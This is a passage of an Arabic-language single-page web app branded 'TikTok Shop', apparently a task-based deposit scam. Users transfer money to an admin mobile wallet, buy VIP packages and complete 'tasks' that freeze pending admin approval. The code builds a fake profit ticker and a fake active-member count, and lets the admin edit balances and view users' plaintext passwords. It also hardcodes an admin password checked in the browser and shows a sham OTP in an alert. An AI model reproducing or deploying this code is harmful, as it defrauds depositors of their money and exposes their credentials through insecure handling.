<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Shop - Admin Mobile Fix</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue, remove, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC5zPaTAAU5lPCZ7LstSQ8J9IWmkQrpcMg",
            authDomain: "tiktokshop-9fd63.firebaseapp.com",
            projectId: "tiktokshop-9fd63",
            storageBucket: "tiktokshop-9fd63.firebasestorage.app",
            messagingSenderId: "1008538085856",
            appId: "1:1008538085856:web:83caa9dc0d7444e12c2385",
            measurementId: "G-1NSG64V4D4"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        window.db = db;
        window.ref = ref;
        window.set = set;
        window.get = get;
        window.update = update;
        window.remove = remove;
        window.onValue = onValue;
        window.push = push;

        console.log("System Ready");
        initializeAppLogic();
    </script>

    <style>
        body { font-family: 'Tajawal', sans-serif; user-select: none; background-color: #f8fafc; margin: 0; padding: 0; }
        .hidden { display: none !important; }
        
        /* ✅ إزالة المربع الأزرق عند النقر في الموبايل */
        * { -webkit-tap-highlight-color: transparent; outline: none; }

        .auth-bg {
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }

        .glass-card {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
            width: 90%;
            max-width: 400px;
            padding: 2rem;
        }

        .modern-input { width: 100%; padding: 12px 15px; border: 1px solid #e5e7eb; border-radius: 12px; background: #f9fafb; outline: none; }
        
        .fade-in { animation: fadeIn 0.4s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* ✅ تحسينات لوحة التحكم للموبايل */
        .admin-sidebar { 
            background: #1e293b; color: white; width: 250px; min-height: 100vh; 
            position: fixed; right: 0; top: 0; padding: 20px; z-index: 100; transition: transform 0.3s ease-in-out;
            box-shadow: -2px 0 10px rgba(0,0,0,0.1);
        }
        
        .admin-content { 
            margin-right: 250px; padding: 20px; min-height: 100vh; background: #f1f5f9; transition: margin 0.3s; 
        }

        .admin-nav-item { display: flex; items-center; padding: 12px 15px; margin-bottom: 8px; border-radius: 10px; cursor: pointer; transition: 0.2s; color: #94a3b8; font-weight: bold; font-size: 14px; }
        .admin-nav-item:hover, .admin-nav-item.active { background: #334155; color: #fbbf24; }
        .admin-nav-item i { margin-left: 10px; width: 25px; text-align: center; }

        /* ✅ Mobile Responsiveness for Admin */
        @media (max-width: 768px) {
            .admin-sidebar { 
                transform: translateX(100%); /* إخفاء القائمة في اليمين */
                width: 260px;
            }
            .admin-sidebar.open {
                transform: translateX(0); /* إظهار القائمة */
            }
            .admin-content { 
                margin-right: 0; /* المحتوى يأخذ كامل الشاشة */
                padding: 15px;
            }
            /* زر القائمة */
            #mobile-menu-btn { display: block !important; }
            /* تظليل الخلفية عند فتح القائمة */
            .sidebar-overlay {
                display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(0,0,0,0.5); z-index: 90;
            }
            .sidebar-overlay.active { display: block; }
        }

        .stat-card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); display: flex; align-items: center; justify-content: space-between; }
        .stat-icon { width: 50px; height: 50px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; }

        .custom-table { width: 100%; border-collapse: collapse; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.05); font-size: 12px; }
        .custom-table th { background: #f8fafc; color: #64748b; padding: 10px; border-bottom: 1px solid #e2e8f0; text-align: right; }
        .custom-table td { padding: 10px; border-bottom: 1px solid #f1f5f9; color: #334155; }
        
        .loader { border: 4px solid #f3f3f3; border-radius: 50%; border-top: 4px solid #000; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 200; display: flex; justify-content: center; align-items: center; }
        .modal-box { background: white; padding: 20px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; max-height: 90vh; overflow-y: auto; }
        
        .slider-container { position: relative; width: 100%; height: 180px; overflow: hidden; border-radius: 1rem; margin-bottom: 1rem; }
        .slide { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-size: cover; background-position: center; opacity: 0; transition: opacity 1s; }
        .slide.active { opacity: 1; }
        
        .animate-marquee { display: inline-block; white-space: nowrap; animation: marquee 15s linear infinite; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    </style>
</head>
<body>

    <div id="loading-overlay" class="fixed inset-0 bg-white z-[999] flex flex-col items-center justify-center">
        <div class="loader mb-4"></div>
        <p class="text-sm text-gray-500 font-bold">جاري التحميل...</p>
    </div>

    <div id="auth-screen" class="auth-bg hidden z-50">
        <div class="glass-card fade-in">
            <div class="text-center mb-6">
                <i class="fa-brands fa-tiktok text-4xl text-black mb-2"></i>
                <h1 class="text-2xl font-bold text-gray-800">TikTok Shop</h1>
            </div>
            <div class="flex bg-gray-100 p-1 rounded-xl mb-6">
                <button onclick="toggleAuth('login')" id="tab-login" class="flex-1 py-2 rounded-lg text-sm font-bold bg-white shadow-sm">دخول</button>
                <button onclick="toggleAuth('register')" id="tab-register" class="flex-1 py-2 rounded-lg text-sm font-bold text-gray-500">جديد</button>
            </div>
            <div id="login-form" class="space-y-4">
                <input type="text" id="login-phone" class="modern-input" placeholder="رقم الهاتف">
                <input type="password" id="login-pass" class="modern-input" placeholder="كلمة المرور">
                <button onclick="loginUser()" class="w-full bg-black text-white py-3 rounded-xl font-bold shadow-lg">دخول</button>
            </div>
            <div id="reg-form" class="space-y-3 hidden">
                <div id="reg-step-1">
                    <input type="number" id="reg-phone" class="modern-input mb-3" placeholder="رقم الهاتف">
                    <button onclick="sendOtp()" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold">إرسال الكود</button>
                </div>
                <div id="reg-step-2" class="hidden text-center">
                    <p class="text-sm text-gray-600 mb-2">الكود المرسل</p>
                    <input type="number" id="reg-otp-input" class="modern-input text-center text-xl mb-3" placeholder="----">
                    <button onclick="verifyOtp()" class="w-full bg-green-600 text-white py-3 rounded-xl font-bold">تأكيد</button>
                </div>
                <div id="reg-step-3" class="hidden space-y-3">
                    <input type="text" id="reg-name" class="modern-input" placeholder="الاسم">
                    <input type="date" id="reg-dob" class="modern-input">
                    <input type="password" id="reg-pass" class="modern-input" placeholder="كلمة المرور">
                    <input type="password" id="reg-pass-confirm" class="modern-input" placeholder="تأكيد كلمة المرور">
                    <button onclick="completeRegistration()" class="w-full bg-yellow-400 text-black py-3 rounded-xl font-bold">تسجيل</button>
                </div>
            </div>
        </div>
    </div>

    <div id="admin-panel" class="hidden flex relative">
        
        <div class="sidebar-overlay" onclick="toggleAdminSidebar()"></div>

        <aside class="admin-sidebar" id="admin-sidebar">
            <div class="flex items-center justify-between mb-8 px-2">
                <div class="flex items-center gap-2">
                    <i class="fa-solid fa-shield-halved text-yellow-400 text-2xl"></i>
                    <span class="text-xl font-bold text-white">Admin Pro</span>
                </div>
                <i class="fa-solid fa-xmark text-white text-xl cursor-pointer md:hidden" onclick="toggleAdminSidebar()"></i>
            </div>
            
            <nav class="space-y-2">
                <div onclick="showAdminTab('dashboard')" class="admin-nav-item active" id="nav-dashboard"><i class="fa-solid fa-chart-pie"></i> <span>الرئيسية</span></div>
                <div onclick="showAdminTab('users')" class="admin-nav-item" id="nav-users"><i class="fa-solid fa-users"></i> <span>العملاء</span></div>
                <div onclick="showAdminTab('tasks')" class="admin-nav-item" id="nav-tasks"><i class="fa-solid fa-list-check"></i> <span>المهام</span></div>
                <div onclick="showAdminTab('signatures')" class="admin-nav-item" id="nav-signatures"><i class="fa-solid fa-gem"></i> <span>الباقات</span></div>
                <div onclick="showAdminTab('requests')" class="admin-nav-item" id="nav-requests"><i class="fa-solid fa-money-bill-transfer"></i> <span>المالية</span></div>
                <div onclick="showAdminTab('support')" class="admin-nav-item" id="nav-support"><i class="fa-solid fa-headset"></i> <span>الدعم</span></div>
                <div onclick="showAdminTab('settings')" class="admin-nav-item" id="nav-settings"><i class="fa-solid fa-gear"></i> <span>الإعدادات</span></div>
                <div onclick="logout()" class="admin-nav-item text-red-400 mt-8"><i class="fa-solid fa-right-from-bracket"></i> <span>خروج</span></div>
            </nav>
        </aside>

        <main class="admin-content flex-1 w-full">
            <header class="flex justify-between items-center mb-6 bg-white p-4 rounded-xl shadow-sm sticky top-0 z-40">
                <div class="flex items-center gap-3">
                    <button id="mobile-menu-btn" class="hidden text-gray-700 text-2xl" onclick="toggleAdminSidebar()">
                        <i class="fa-solid fa-bars"></i>
                    </button>
                    <h2 class="text-xl font-bold text-gray-800" id="page-title">لوحة التحكم</h2>
                </div>
                <div class="flex items-center gap-2"><span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span><span class="text-xs text-gray-500 font-bold">Live</span></div>
            </header>

            <div id="admin-dashboard-sec" class="admin-section">
                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                    <div class="stat-card"><div><p class="text-gray-500 text-xs font-bold">العملاء</p><h3 class="text-2xl font-bold text-gray-800" id="stat-total-users">0</h3></div><div class="stat-icon bg-blue-100 text-blue-600"><i class="fa-solid fa-users"></i></div></div>
                    <div class="stat-card"><div><p class="text-gray-500 text-xs font-bold">الأرصدة</p><h3 class="text-2xl font-bold text-green-600" id="stat-total-balance">0</h3></div><div class="stat-icon bg-green-100 text-green-600"><i class="fa-solid fa-wallet"></i></div></div>
                    <div class="stat-card"><div><p class="text-gray-500 text-xs font-bold">طلبات</p><h3 class="text-2xl font-bold text-orange-500" id="stat-pending-req">0</h3></div><div class="stat-icon bg-orange-100 text-orange-600"><i class="fa-solid fa-clock"></i></div></div>
                </div>
            </div>

            <div id="admin-users-sec" class="hidden admin-section">
                <div class="bg-white rounded-xl shadow-sm p-4">
                    <input type="text" id="search-user" onkeyup="searchUsers()" placeholder="بحث برقم الهاتف..." class="border p-2 rounded-lg w-full mb-4 text-sm bg-gray-50">
                    <div class="overflow-x-auto"><table class="custom-table"><thead><tr><th>العميل</th><th>باسورد</th><th>رصيد</th><th>حالة</th><th>تحكم</th></tr></thead><tbody id="admin-users-list"></tbody></table></div>
                </div>
            </div>

            <div id="admin-tasks-sec" class="hidden admin-section">
                <div class="flex justify-between mb-4"><h3 class="font-bold">المهام</h3><button onclick="saveAdminTasks()" class="bg-green-600 text-white px-3 py-1 rounded text-sm">حفظ</button></div>
                <div id="admin-tasks-container" class="space-y-3"></div>
            </div>

            <div id="admin-signatures-sec" class="hidden admin-section">
                <div class="flex justify-between mb-4"><h3 class="font-bold">الباقات</h3><button onclick="saveAdminSignatures()" class="bg-green-600 text-white px-3 py-1 rounded text-sm">حفظ</button></div>
                <div id="admin-signatures-container" class="space-y-3"></div>
                <button onclick="addNewSignature()" class="mt-4 w-full bg-orange-100 text-orange-600 py-2 rounded-lg font-bold">+ إضافة</button>
            </div>

            <div id="admin-requests-sec" class="hidden admin-section">
                <div class="bg-white rounded-xl shadow-sm p-4 overflow-x-auto"><table class="custom-table"><thead><tr><th>المرسل</th><th>المبلغ</th><th>الصورة</th><th>إجراء</th></tr></thead><tbody id="admin-requests-list"></tbody></table></div>
            </div>

            <div id="admin-support-sec" class="hidden admin-section">
                <div class="bg-white rounded-xl shadow-sm p-4 overflow-x-auto"><table class="custom-table"><thead><tr><th>العميل</th><th>الرسالة</th><th>التحكم</th></tr></thead><tbody id="admin-support-list"></tbody></table></div>
            </div>

            <div id="admin-settings-sec" class="hidden admin-section">
                <div class="bg-white p-4 rounded-xl shadow-sm space-y-3">
                    <label class="block text-sm font-bold text-gray-600">رقم المحفظة</label><input type="text" id="setting-cash-number" class="w-full border p-2 rounded-lg">
                    <label class="block text-sm font-bold text-gray-600">رابط الدعم</label><input type="text" id="setting-support-link" class="w-full border p-2 rounded-lg">
                    <label class="block text-sm font-bold text-gray-600">الإعلانات</label><input type="text" id="setting-announcement" class="w-full border p-2 rounded-lg">
                    <button onclick="saveSiteSettings()" class="w-full bg-black text-white py-2 rounded-lg font-bold mt-2">حفظ</button>
                </div>
            </div>
        </main>
    </div>

    <div id="client-app" class="hidden relative pb-20 bg-gray-50 min-h-screen">
        <div id="recharge-modal" class="modal-overlay hidden">
            <div class="modal-box">
                <button onclick="closeRechargeModal()" class="absolute top-2 left-3 text-2xl font-bold text-gray-700">&times;</button>
                <h3 class="text-xl font-bold mb-4 text-gray-800">شحن الرصيد</h3>
                <div class="bg-yellow-50 p-3 rounded text-sm mb-4 text-yellow-800 font-bold border border-yellow-200 text-center"><p class="mb-1">تحويل إلى:</p><div class="flex items-center justify-center gap-2"><span id="recharge-admin-number" class="text-lg text-black font-mono font-bold">...</span><i onclick="copyToClipboard()" class="fa-regular fa-copy cursor-pointer"></i></div></div>
                <input type="number" id="charge-amount" class="w-full p-2 border rounded mb-2 bg-gray-50 text-right" placeholder="المبلغ">
                <input type="text" id="charge-name" class="w-full p-2 border rounded mb-2 bg-gray-50 text-right" placeholder="اسم المحول">
                <input type="text" id="charge-sender" class="w-full p-2 border rounded mb-2 bg-gray-50 text-right" placeholder="رقم المحفظة">
                <input type="file" id="recharge-file-input" class="hidden" accept="image/*" onchange="handleFileSelect(event)">
                <label for="recharge-file-input" class="flex flex-col items-center justify-center border-2 border-dashed border-gray-300 p-4 rounded mb-4 cursor-pointer hover:bg-gray-100"><i id="upload-icon" class="fa-solid fa-cloud-upload text-2xl text-gray-400"></i><span id="upload-text" class="text-xs text-gray-500 mt-1">صورة التحويل</span><img id="upload-preview" src="" class="hidden w-full h-20 object-cover rounded mt-2"></label>
                <button onclick="submitRechargeRequest()" class="w-full bg-black text-white py-2 rounded-lg font-bold shadow-lg">إرسال</button>
            </div>
        </div>

        <div id="home-page" class="fade-in p-4">
            <header class="flex justify-between items-center mb-4 pt-2">
                <i class="fa-regular fa-bell text-xl text-gray-600"></i>
                <div class="flex items-center gap-2"><span class="font-bold text-lg">TikTok Shop</span><i class="fa-brands fa-tiktok text-2xl text-black"></i></div>
                <i onclick="switchTab('support-page')" class="fa-solid fa-headset text-2xl text-purple-600 cursor-pointer"></i>
            </header>
            <div class="bg-blue-600 text-white text-center py-2 px-2 mb-4 shadow-lg text-sm font-bold rounded-lg overflow-hidden whitespace-nowrap"><span id="announcement-display-text" class="animate-marquee">...</span></div>
            <div class="slider-container rounded-2xl overflow-hidden shadow-lg mb-6 h-48 relative">
                <div class="slide active" style="background-image: url('https://images.unsplash.com/photo-1607082348824-0a96f2a4b9da?w=800');"></div>
                <div class="slide" style="background-image: url('https://images.unsplash.com/photo-1483985988355-763728e1935b?w=800');"></div>
                <div class="slide" style="background-image: url('https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=800');"></div>
            </div>
            <div class="grid grid-cols-2 gap-4 mb-6">
                <div onclick="openRechargeModal()" class="bg-white p-4 rounded-2xl shadow-sm text-center border active:scale-95 transition"><div class="w-10 h-10 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-2 text-blue-600"><i class="fa-solid fa-wallet"></i></div><h3 class="font-bold text-sm">شحن</h3></div>
                <div class="bg-white p-4 rounded-2xl shadow-sm text-center border"><div class="w-10 h-10 bg-yellow-50 rounded-full flex items-center justify-center mx-auto mb-2 text-yellow-600"><i class="fa-solid fa-sack-dollar"></i></div><h3 class="font-bold text-sm">سحوبات</h3><div id="fake-profit-ticker" class="h-8 overflow-hidden relative mt-1"></div></div>
            </div>
            <div class="mt-4 text-center pt-2 border-t"><p class="text-gray-400 text-xs font-bold">الأعضاء النشطين</p><div class="flex justify-center items-center gap-2 text-gray-800"><i class="fa-solid fa-users text-blue-500"></i><p class="text-xl font-bold" id="fake-user-count">54,230</p></div></div>
        </div>

        <div id="support-page" class="hidden fade-in p-4 pb-24">
            <h2 class="font-bold text-xl mb-4 text-center">الدعم الفني</h2>
            <div id="client-support-history" class="mb-4 space-y-3 max-h-[50vh] overflow-y-auto p-2 bg-gray-100 rounded-lg"></div>
            <textarea id="support-msg-input" rows="2" class="w-full p-2 border rounded-lg mb-2" placeholder="رسالتك..."></textarea>
            <button onclick="sendSupportMessage()" class="w-full bg-purple-600 text-white py-2 rounded-lg font-bold">إرسال</button>
            <a id="direct-support-btn" href="#" target="_blank" class="block w-full mt-4 bg-green-500 text-white text-center py-2 rounded-lg font-bold">واتساب</a>
        </div>

        <div id="signature-page" class="hidden fade-in p-4 pb-24"><h2 class="text-center font-bold text-xl mb-6">الباقات</h2><div id="signature-list" class="space-y-4"></div></div>

        <div id="work-page" class="hidden fade-in min-h-screen bg-yellow-400 relative pb-24">
            <div class="p-6 text-black"><span class="font-bold text-2xl">المهام</span></div>
            <div id="sign-alert" class="bg-white/90 m-4 p-6 rounded-2xl shadow-lg text-center hidden"><i class="fa-solid fa-lock text-4xl text-red-500 mb-4 block"></i><h3 class="font-bold">مغلق</h3><p class="text-sm text-gray-500 mb-4">اشترك في باقة</p><button onclick="switchTab('signature-page', document.getElementById('nav-sign'))" class="bg-black text-white px-4 py-2 rounded-full">عرض الباقات</button></div>
            <div id="task-area" class="px-4 transition-all duration-300">
                <div id="frozen-message" class="hidden frozen-overlay text-center p-6 m-4 shadow-xl border-2 border-yellow-600 rounded-2xl bg-white"><i class="fa-solid fa-clock text-4xl text-yellow-600 mb-4 block"></i><h3 class="font-bold">قيد المراجعة</h3><p class="text-sm text-gray-500">انتظر موافقة المدير</p></div>
                <div class="bg-white rounded-2xl p-6 shadow-lg mb-6">
                    <div class="flex justify-between items-start mb-4"><div><p id="task-name" class="font-bold text-lg mb-1">...</p><p class="text-gray-500 text-sm">مطلوب: <span id="task-price" class="text-black font-bold">0</span> ج.م</p></div><img id="task-img" src="" class="w-16 h-16 rounded-lg object-cover bg-gray-100"></div>
                    <div class="flex justify-between bg-gray-50 p-3 rounded-xl"><div class="text-center"><span class="block text-xs text-gray-400">عمولة</span><span id="task-commission" class="font-bold text-green-600">0</span></div><div class="text-center"><span class="block text-xs text-gray-400">المهمة</span><span id="task-counter" class="font-bold">0/24</span></div></div>
                </div>
                <button id="work-btn" onclick="processTask()" class="w-full bg-black text-white py-3 rounded-xl font-bold shadow-lg text-lg active:scale-95 transition">بدء</button>
            </div>
        </div>

        <div id="profile-page" class="hidden fade-in min-h-screen bg-white pb-24">
            <div class="bg-yellow-400 p-6 rounded-b-[3rem] shadow-sm mb-6">
                <div class="flex items-center gap-4 mb-6"><div class="w-14 h-14 bg-white rounded-full flex items-center justify-center text-2xl font-bold text-yellow-600"><i class="fa-solid fa-user"></i></div><div><h2 id="profile-name" class="font-bold text-lg text-black">User</h2><p id="profile-phone" class="text-yellow-900 text-sm font-mono">010xxxx</p></div></div>
                <div class="bg-white/90 backdrop-blur rounded-2xl p-4 flex justify-between text-center shadow-lg"><div><span class="block text-xs text-gray-500">رصيد</span><span id="profile-balance" class="text-lg font-bold">0</span></div><div><span class="block text-xs text-gray-500">أرباح</span><span id="profile-total-income" class="text-lg font-bold text-green-600">0</span></div></div>
            </div>
            <div class="px-6 space-y-3"><button onclick="attemptWithdraw()" class="w-full bg-gray-900 text-white py-3 rounded-xl font-bold shadow-lg">سحب الأرباح</button><button onclick="logout()" class="w-full border border-red-200 text-red-500 py-3 rounded-xl font-bold">خروج</button></div>
        </div>

        <div id="history-page" class="hidden fade-in text-center pt-20"><i class="fa-solid fa-box-open text-6xl text-gray-200 mb-4"></i><p class="text-gray-400">فارغ</p></div>

        <nav id="bottom-nav" class="hidden fixed bottom-0 left-0 w-full bg-white border-t border-gray-100 flex justify-around py-3 pb-6 z-40 shadow-[0_-10px_20px_rgba(0,0,0,0.05)] rounded-t-2xl">
            <div id="nav-home" onclick="switchTab('home-page', this)" class="nav-item active text-center cursor-pointer w-1/5"><i class="fa-solid fa-house text-xl mb-1 block"></i><span class="text-[10px] font-bold">الرئيسية</span></div>
            <div id="nav-sign" onclick="switchTab('signature-page', this)" class="nav-item text-center cursor-pointer w-1/5"><i class="fa-solid fa-crown text-xl mb-1 block"></i><span class="text-[10px] font-bold">الباقات</span></div>
            <div id="nav-work" onclick="switchTab('work-page', this)" class="nav-item text-center cursor-pointer w-1/5 relative"><div class="absolute -top-8 left-1/2 transform -translate-x-1/2 bg-yellow-400 w-12 h-12 rounded-full flex items-center justify-center border-4 border-white shadow-xl text-black"><i class="fa-solid fa-briefcase text-lg"></i></div><span class="text-[10px] font-bold mt-6 block">العمل</span></div>
            <div id="nav-hist" onclick="switchTab('history-page', this)" class="nav-item text-center cursor-pointer w-1/5"><i class="fa-solid fa-clock-rotate-left text-xl mb-1 block"></i><span class="text-[10px] font-bold">السجل</span></div>
            <div id="nav-prof" onclick="switchTab('profile-page', this)" class="nav-item text-center cursor-pointer w-1/5"><i class="fa-solid fa-user text-xl mb-1 block"></i><span class="text-[10px] font-bold">حسابي</span></div>
        </nav>
    </div>

    <script>
        let tasks=[], currentUser=null, allUsers=[], allRequests=[], supportMessages=[], siteSettings={}, signatures=[];
        let generatedOtp=null, registeringPhone=null, selectedFile=null;

        function initializeAppLogic() {
            setTimeout(() => {
                document.getElementById('loading-overlay').classList.add('hidden');
                document.getElementById('auth-screen').classList.remove('hidden');
                setupRealtimeListeners();
                renderSignatures();
                startFakeTicker();
                startImageSlider();
                startFakeUserCount();
            }, 1000);
        }

        function setupRealtimeListeners() {
            window.onValue(window.ref(window.db, 'tasks'), (s) => { if(s.val()) tasks=Object.values(s.val()); else seedTasks(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminTasksUI(); });
            window.onValue(window.ref(window.db, 'users'), (s) => { if(s.val()) allUsers=Object.values(s.val()); updateDashboardStats(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminUsersUI(); });
            window.onValue(window.ref(window.db, 'signatures'), (s) => { if(s.val()) signatures=s.val(); else seedSignatures(); renderSignatures(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminSignaturesUI(); });
            window.onValue(window.ref(window.db, 'recharge_requests'), (s) => { if(s.val()) allRequests=Object.entries(s.val()).map(([k,v])=>({id:k,...v})); updateDashboardStats(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminRequestsUI(); });
            window.onValue(window.ref(window.db, 'settings'), (s) => { siteSettings=s.val()||{vodafoneCashNumber:'010',siteAnnouncement:'Welcome',supportLink:'#'}; updateClientSettingsUI(); });
            window.onValue(window.ref(window.db, 'support_messages'), (s) => { if(s.val()) { supportMessages=Object.entries(s.val()).map(([k,v])=>({id:k,...v})); if(currentUser) renderClientSupportHistory(); if(document.getElementById('admin-panel').style.display !== 'none') renderAdminSupportUI(); } });
        }

        function seedTasks() { let t=[]; for(let i=1;i<=24;i++) t.push({id:i, name:`مهمة ${i}`, price:i*100, commission:i*10, img:`https://source.unsplash.com/random/200x200?sig=${i}`}); window.set(window.ref(window.db,'tasks'), t); }
        function seedSignatures() { let s=[{name:"VIP1",price:300,img:""},{name:"VIP2",price:500,img:""},{name:"VIP3",price:1000,img:""}]; window.set(window.ref(window.db,'signatures'), s); }

        window.toggleAdminSidebar = () => {
            const sidebar = document.getElementById('admin-sidebar');
            const overlay = document.querySelector('.sidebar-overlay');
            sidebar.classList.toggle('open');
            overlay.classList.toggle('active');
        }

        window.toggleAuth = (t) => { document.getElementById('login-form').classList.toggle('hidden', t!=='login'); document.getElementById('reg-form').classList.toggle('hidden', t!=='register'); document.getElementById('tab-login').classList.toggle('text-gray-500', t!=='login'); document.getElementById('tab-register').classList.toggle('text-gray-500', t!=='register'); }
        window.sendOtp = () => { registeringPhone=document.getElementById('reg-phone').value; if(!registeringPhone) return alert("الرقم مطلوب"); window.get(window.ref(window.db,'users/'+registeringPhone)).then(s=>{ if(s.exists()){alert("مسجل");window.toggleAuth('login');}else{ generatedOtp=Math.floor(1000+Math.random()*9000); alert("الكود: "+generatedOtp); document.getElementById('reg-step-1').classList.add('hidden'); document.getElementById('reg-step-2').classList.remove('hidden'); } }); }
        window.verifyOtp = () => { if(document.getElementById('reg-otp-input').value==generatedOtp){ document.getElementById('reg-step-2').classList.add('hidden'); document.getElementById('reg-step-3').classList.remove('hidden'); } else alert("خطأ"); }
        
        window.completeRegistration = () => {
            const n=document.getElementById('reg-name').value, d=document.getElementById('reg-dob').value, p=document.getElementById('reg-pass').value, pc=document.getElementById('reg-pass-confirm').value;
            if(!n||!d||!p||!pc) return alert("ناقص");
            const bDate=new Date(d), today=new Date(); let age=today.getFullYear()-bDate.getFullYear(); if(today.getMonth()<bDate.getMonth()||(today.getMonth()===bDate.getMonth()&&today.getDate()<bDate.getDate())) age--;
            if(age<16) return alert("يجب أن يكون العمر 16+");
            if(p.length<6) return alert("كلمة السر ضعيفة (6+)");
            if(p!==pc) return alert("كلمة السر غير متطابقة");
            window.set(window.ref(window.db,'users/'+registeringPhone), {name:n, phone:registeringPhone, dob:d, password:p, balance:0, totalIncome:0, currentTaskIndex:1, isTaskFrozen:false, isSigned:false, isBanned:false}).then(()=>{alert("تم"); window.toggleAuth('login'); document.getElementById('reg-step-3').classList.add('hidden'); document.getElementById('reg-step-1').classList.remove('hidden');});
        }

        window.loginUser = () => {
            const p=document.getElementById('login-phone').value, pw=document.getElementById('login-pass').value;
            if(p==='admin' && pw==='mohy123') { document.getElementById('auth-screen').classList.add('hidden'); document.getElementById('admin-panel').classList.remove('hidden'); showAdminTab('dashboard'); return; }
            window.get(window.ref(window.db,'users/'+p)).then(s=>{
                if(s.exists()&&s.val().password===pw) {
                    if(s.val().isBanned) return alert("محظور");
                    currentUser=s.val();
                    window.onValue(window.ref(window.db,'users/'+p),(snap)=>{currentUser=snap.val(); if(currentUser) updateAppUI();});
                    document.getElementById('auth-screen').classList.add('hidden');
                    document.getElementById('client-app').classList.remove('hidden');
                    document.getElementById('bottom-nav').classList.remove('hidden');
                    updateAppUI();
                } else alert("بيانات خاطئة");
            });
        }
        window.logout = () => { if(confirm("خروج؟")) location.reload(); }

        function updateAppUI() {
            if(currentUser.isBanned) { alert("تم حظرك"); location.reload(); return; }
            document.getElementById('profile-name').innerText = currentUser.name;
            document.getElementById('profile-phone').innerText = currentUser.phone;
            document.getElementById('profile-balance').innerText = currentUser.balance.toFixed(2);
            document.getElementById('profile-total-income').innerText = currentUser.totalIncome.toFixed(2);
            renderClientSupportHistory();
            updateWorkPage();
        }
        function updateClientSettingsUI() { document.getElementById('recharge-admin-number').innerText=siteSettings.vodafoneCashNumber; document.getElementById('announcement-display-text').innerText=siteSettings.siteAnnouncement; document.getElementById('direct-support-btn').href=siteSettings.supportLink; }
        function updateDashboardStats() { document.getElementById('stat-total-users').innerText=allUsers.length; document.getElementById('stat-total-balance').innerText=allUsers.reduce((a,u)=>a+(u.balance||0),0).toFixed(0); document.getElementById('stat-pending-req').innerText=allRequests.filter(r=>r.status==='pending').length; }

        window.showAdminTab = (t) => {
            document.querySelectorAll('.admin-section').forEach(e=>e.classList.add('hidden'));
            document.querySelectorAll('.admin-nav-item').forEach(e=>e.classList.remove('active'));
            document.getElementById(`admin-${t}-sec`).classList.remove('hidden');
            if(document.getElementById(`nav-${t}`)) document.getElementById(`nav-${t}`).classList.add('active');
            if(window.innerWidth <= 768) {
                document.getElementById('admin-sidebar').classList.remove('open');
                document.querySelector('.sidebar-overlay').classList.remove('active');
            }
            if(t==='users') renderAdminUsersUI();
            if(t==='tasks') renderAdminTasksUI();
            if(t==='signatures') renderAdminSignaturesUI();
            if(t==='requests') renderAdminRequestsUI();
            if(t==='support') renderAdminSupportUI();
            if(t==='settings') renderAdminSettingsUI();
        }

        window.searchUsers = () => { renderAdminUsersUI(document.getElementById('search-user').value); }
        function renderAdminUsersUI(filter='') {
            let h=''; allUsers.filter(u=>u.phone.includes(filter)).forEach(u=>{
                let s = u.isBanned ? '<span class="text-red-500 text-xs">محظور</span>' : '<span class="text-green-500 text-xs">نشط</span>';
                if(u.isTaskFrozen) s += ' <span class="text-yellow-600 text-xs">مجمد</span>';
                let b = `<button onclick="editUserBalance('${u.phone}',${u.balance})" class="text-blue-500 mx-1"><i class="fa-solid fa-pen"></i></button>`;
                if(u.isTaskFrozen) b += `<button onclick="unlockNextTask('${u.phone}',${u.currentTaskIndex})" class="text-yellow-500 mx-1"><i class="fa-solid fa-lock-open"></i></button>`;
                b += u.isBanned ? `<button onclick="unbanUser('${u.phone}')" class="text-gray-500 mx-1"><i class="fa-solid fa-rotate-left"></i></button>` : `<button onclick="banUser('${u.phone}')" class="text-red-500 mx-1"><i class="fa-solid fa-ban"></i></button>`;
                b += `<button onclick="deleteUser('${u.phone}')" class="text-red-700 mx-1"><i class="fa-solid fa-trash"></i></button>`;
